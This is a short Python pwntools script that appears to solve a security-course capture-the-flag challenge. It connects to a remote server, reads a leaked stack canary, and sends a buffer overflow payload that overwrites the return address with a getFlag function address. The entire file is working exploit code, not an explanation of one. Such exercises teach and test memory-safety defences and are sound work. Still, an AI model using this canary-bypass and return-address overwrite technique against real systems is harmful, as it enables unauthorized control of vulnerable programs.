from pwn import *


# Connect to the server
io = remote('inf226.puffling.no', 7002)

# Buffer size 16 + 8 for canary
buffer = b'0'*16
offset = b'0'*8 

# Get the canary
io.sendline('24')
#Receiving a line on the form: "Here's a hint: <canary>"
canary = int(io.recvline().split()[-1], 16)
canary = p64(canary)

getFlag = p64(0x40121b)



# Buffer + offset + canary + offset + getFlag
payload = buffer + offset + canary + offset + getFlag
print(payload)


io.send(payload)
io.shutdown('out')

print(io.readall())

